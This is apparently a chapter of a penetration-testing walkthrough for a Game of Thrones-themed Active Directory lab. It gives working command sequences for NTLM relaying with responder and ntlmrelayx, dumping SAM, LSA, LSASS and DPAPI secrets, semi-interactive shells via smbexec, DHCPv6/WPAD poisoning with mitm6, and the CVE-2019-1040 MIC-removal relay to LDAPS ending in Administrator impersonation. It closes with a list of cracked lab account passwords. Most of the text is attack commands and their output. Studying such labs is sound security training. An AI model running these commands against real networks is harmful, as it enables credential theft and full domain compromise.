Chapter [2](./2%20-%20Anonymous%20User%20Enumeration.md) of this project has shown that `responder` was able to capture `NetNTLMv2` hashes, where one of them (of `eddard.stark`) was not crack-able due to the password being strong. It is still possible however, to relay that `NetNTLMv2` hash to another protocol which supports `NTLM` authentication (e.g. `SMB, HTTP, LDAP, MSSQL, RDP`).

### NTLM Relaying
The process of the `NTLM` relay looks roughly like this:
```bash
# LLMNR

1. Eddard --[Give me the IP address to Meren]--> DNS
2. Eddard <--[I dont know Meren]-- DNS
3. Eddard --[Does anyone know Meren (LLMNR)]--> (Everyone in the network)
4. Eddard <--[I am Meren, here is my IP]-- Attacker

# Capturing NTLM Hash

1. Eddard --[I am Eddard, i want to authenticate to Meren]--> Attacker
2. Attacker --[I am Eddard, i want to authenticate to Meereen]--> Meereen
3. Attacker <--[Here is the NTLM challenge]-- Meereen
4. Eddard <--[Here is the NTLM challenge]-- Attacker
5. Eddard --[Here is my NETNTLMv2 Hash]--> Hacker

# The hash was captured, but cracking it was not successful
# therefore, attempt NTLM Relaying

1. Attacker --[Here is my NETNTLMv2 Hash]--> Meereen
2. Attacker <--[Thanks Eddard, here is your session]-- Meereen

```

`SMB` is the prime target for `NTLM-Relays`, as it's session provides a lot of possibilities for exploitation. Therefore `SMB-signing` must not be enforced, or this relay will fail. `netexec` provides the possibility to scan a wide IP-range for targets which do not enforce `SMB-signing`:
```bash
nxc smb 10.3.10.10-23 --gen-relay-list output.txt
```
The created `output.txt` holds all `SMB` hosts which are vulnerable to `NTLM-Relaying`. Within that file, `SRV03` (`Braavos`) and `SRV02`(`CASTELBLACK`) are the targets.

To prepare for `NTLM-Relaying`, the config file of `responder` must be edited. A short command automatically finds this file and edits it:
```bash
find / -name "Responder.conf" 2&>0 -exec sudo vim {} \;
```
The following tweaks to it must be made:
```bash
...
; Servers to start
SQL      = On
SMB      = Off # was On!
QUIC     = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = Off # was On!
HTTPS    = On
DNS      = On
...
```
This must be done to prevent `responder` from capturing the hashes, as we want to relay them and not capture them.

The relaying server can be started using the tool `ntlmrelayx` of the `impacket` suite. The command to do so looks like this:
```bash
impacket-ntlmrelayx -tf output.txt --keep-relaying -smb2support -socks
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -tf: file of IPs that are vulnerable to NTLM relaying
# --keep-relaying: do not stop after successful relay
# -smb2support: use SMBv2 instead of legacy SMB
# -socks: start integrated socks proxy
```

Before starting `responder` to relay `NTLM` hashes to `SMB`, make sure to edit the config file of `proxychains` (located at `/etc/proxychains4.conf`), as `ntlmrelayx` starts a socks server on port `1080`, and the default configuration may open a port on `9050`:
```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 1080 # Changed from 9050!
```
Alternatively, `ntlmrelayx` may also be started using the additional flag to match the `proxychains` port:
```bash
-socks-port 9050
```

And lastly, `responder` can be started to listen for the initial mis-typing of the domain `Meereen` by the user `eddard.stark`:
```bash
sudo responder -I eth0
```

This starts the chain-reaction which leads to the interception of `eddard.stark`'s session using his `NetNTLMv2` hash! The `socks` request within `ntlmrelayx` should look like this:
```bash
Protocol  Target      Username            AdminStatus  Port 
--------  ----------  ------------------  -----------  ----
SMB       10.3.10.23  NORTH/EDDARD.STARK  FALSE        445  
SMB       10.3.10.23  NORTH/ROBB.STARK    FALSE        445  
SMB       10.3.10.22  NORTH/EDDARD.STARK  TRUE         445  
SMB       10.3.10.22  NORTH/ROBB.STARK    FALSE        445
```
To test this connection, a `smbclient` session may be started using `eddard.stark`'s `NetNTLMv2` hash through the `socks proxy` as follows:
```bash
proxychains impacket-smbclient -no-pass 'north'/'eddard.stark'@'10.3.10.22'
```

### Gathering Secrets
Luckily enough `eddard.stark` has the `AdminStatus` flag set to `TRUE` on `SRV02`(`CASTELBLACK`). This means that he is a `Administrator` account on that system. That information allows us to execute the tool `secretsdump` from the `impacket` suite, which uses these `Administrator` privilege to dump various nice things from the server. It's syntax looks roughly like this:
```bash
proxychains impacket-secretsdump -no-pass 'north'/'eddard.stark'@'10.3.10.22'
```

These are some of the things which are gathered from this tool:

- `Security Account Manager (SAM) database dump`: Password hashes for local accounts (not necessarily domain accounts!), which can be passed using `Pass-The-Hash`.

- `Cached Domain Logon Information`: Cached password hashes of domain users which were recently logged on

- `Local Security Authority (LSA) Secrets`: Machine password, encryption- and decryption key

- `_SC_MSSQL$SQLEXPRESS`: The clear-text password of the service account `sql_svc`, which is `sql_svc:YouWillNotKerboroast1ngMeeeeee`

The user accounts exposed in the `SAM database` dump follow the structure of `domain\uid:rid:lmhash:nthash`. An attempt was made to crack them using mode `1000` of `hashcat` (`NTLM`), but with no success. The `NTHash` part can still be used for `Pass-The-Hash` attacks though!

#### Alternative tools
Alternatively, the tool `lsassy` can dump the `Local Security Authority Subsystem Service` (`LSASS`). In there, hashed passwords (for `cracking` or `PtH`), clear-text passwords or `TGT's` can be found. This command executes `lsassy` using the relayed `NTLM` hash:
```bash
proxychains lsassy --no-pass -d north.sevenkingdoms.local -u eddard.stark 10.3.10.22
```

`donpapi` is another nice secret-gathering tool, as it remotely dumps the `Windows Data Protection API` (`DPAPI`). In there, cached browser credentials / cookies, windows certificates or credentials from different sources may be found. The following command uses the `socks` proxy again, to dump the `DPAPI`:
```bash
proxychains donpapi collect -t '10.3.10.22' -d 'north.sevenkingdoms.local' -u 'eddard.stark' --no-pass
```

It is also possible to get code execution via `smb` by passing the `NTLM` hash to receive a semi-interactive shell using the tool `smbexec` from the `impacket` suite:
```bash
proxychains impacket-smbexec -no-pass 'NORTH'/'eddard.stark'@'10.3.10.22'
```

### DHCPv6 Spoofing & Poisoning
`IPv6` is enabled by default in Windows environments, and is preferred over `IPv4`. When a Windows machine boots, it periodically sends a multicast `DHCPv6-request`. An attacker in the network may reply to these `DHCPv6-requests` and imitate an `DHCP` server. If a client accepts the fake `DHCPv6` server, the rogue `DHCPv6` provides attacker-controlled `DNS` server information. If the victim also has `automatically discover proxy settings` (`WPAD`) set to active, a request to a `Proxy-Auto-Configuration` (`PAC`) file may be sent, using `http` (`http://fakewpad.domain/wpad.dat`). A `challenge-response` can be initiated for this resource to intercept the clients `NTLM` hash!

To start the rogue `DHCPv6` server, the tool `mitm6` may be used:
```bash
sudo mitm6 -i eth0 -d essos.local
```
`ntlmrelayx` may then be used to start the rogue `WPAD` server, which expects `NTLM` hashes for the configuration file of the proxy:
```bash
impacket-ntlmrelayx -6 -wh fakewpad.essos.local -l loot
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -6: enables IPv6 relay scenarios
# -wh: WPAD Host name
# -l: Directory to save the harvested loot (NTLM hashes)
```

Alternatively, these hashes can also be relayed to `ldaps`, where other options open up such as creating a new computer account (by default, each user is allowed to create 10). The command then looks like this:
```bash
impacket-ntlmrelayx -6 -wh fakewpad.essos.local -t ldaps://10.3.10.12 --add-computer attacker --delegate-access
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -t: target the ldaps service for relaying
# --add-computer: adds a new computer account
# --delegate-access: allows the created account to impersonate other users
```

### Drop-The-Mic
The `Message-Integrity-Code` (`MIC`) is a signature used during `NTLM` authentication. It is computed based on the secret of the client, so `MitM` attacks cannot re-compute them. They are used to verify the integrity of `NTLM` messages, mainly so that they do not get relayed (e.g. from `SMB` to `LDAP`). They are optional however, and they can be removed (a flag checks if it is present). `CVE-2019-1040` (Drop The Mic) is based on a bug, where the `MIC` can be removed, even if the flag indicates its presence! This opens up the possibility that `SMB` communication can be relayed to other services such as `LDAP`.

Using `ntlmrelayx`, the `SMB` authentication can be relayed to `LDAPS` by adding the additional flag `--remove-mic`. The following command relays `SMB` connections to `LDAPS` (to `DC03`, `MEEREEN`), and creates a new computer account on behalf of the victim:
```bash
impacket-ntlmrelayx -t ldaps://10.3.10.12 -smb2support --remove-mic --add-computer attacker-computer --delegate-access
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -t: target the ldaps service for relaying
# --add-computer: adds a new computer account
# --delegate-access: allows the created account to impersonate other users
```
> **_NOTE:_** If this does not work, try to use `impacket-0.10.0`, as it worked reliably there

Now we only need to somehow initiate a `SMB` connection to our relay server. A tool named `coercer` tries multiple techniques to try and get a `SMB` connection to our rogue server. The following command is used for the `SRV03` (`BRAAVOS`), using the account of `khal.drogo`, as he is an account on `essos.local`:
```bash
coercer coerce -u khal.drogo -p horse -d essos.local -t braavos.essos.local -l <local_ip>
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: domain user
# -p: his password
# -d: the domain he is registered in
# -t: the target of coercion
# -l: local ip, where the rogue server sits
```

The output should tell you something like this:
```bash
[*] Attempting to create computer in: CN=Computers,DC=essos,DC=local
[*] Adding new computer with username: rmmic2$ and password: -{QVP.^}OMY6{ii result: OK
[*] Delegation rights modified succesfully!
[*] rmmic2$ can now impersonate users on BRAAVOS$ via S4U2Proxy
```

Using this newly created account which can impersonate other users, the `Service Ticket` of the `Administrator` can be fetched as follows:
```bash
getST.py -spn host/braavos.essos.local 'ESSOS.LOCAL/rmmic2$:-{QVP.^}OMY6{ii' -dc-ip 10.3.10.12 -impersonate Administrator
```
This service ticket can then be used to execute commands such as `secretsdump`:
```bash
export KRB5CCNAME=./Administrator.ccache
```
```bash
impacket-secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
```

### Summary of users
```bash
NORTH/samwell.tarly:Heartsbane # Anonymous SMB enum, Password in tje Desc.
NORTH/arya.stark:Needle # SMB Guest-access, Password in a file
NORTH/brandon.stark:iseedeadpeople # AS-REP Roasting, Hash cracked
ESSOS/missandei:fr3edom # AS-REP Roasting, Hash cracked
NORTH/robb.stark:sexywolfy # LLMNR Attack, Hash cracked
NORTH/hodor:hodor # Password Spray, name=pass
NORTH/rickon.stark:Winter2022 # Password Spray, guessable password
NORTH/jon.snow:iknownothing  # Kerberoasting, Hash cracked
NORTH/jeor.mormont:_L0ngCl@w_ # Cleartext Password in SYSVOL share
ESSOS/khal.drogo:horse # targeted Kerberoast, Hash cracked

#-- New users: --
NORTH/sql_svc:YouWillNotKerboroast1ngMeeeeee # Clear-text password in secrets
```
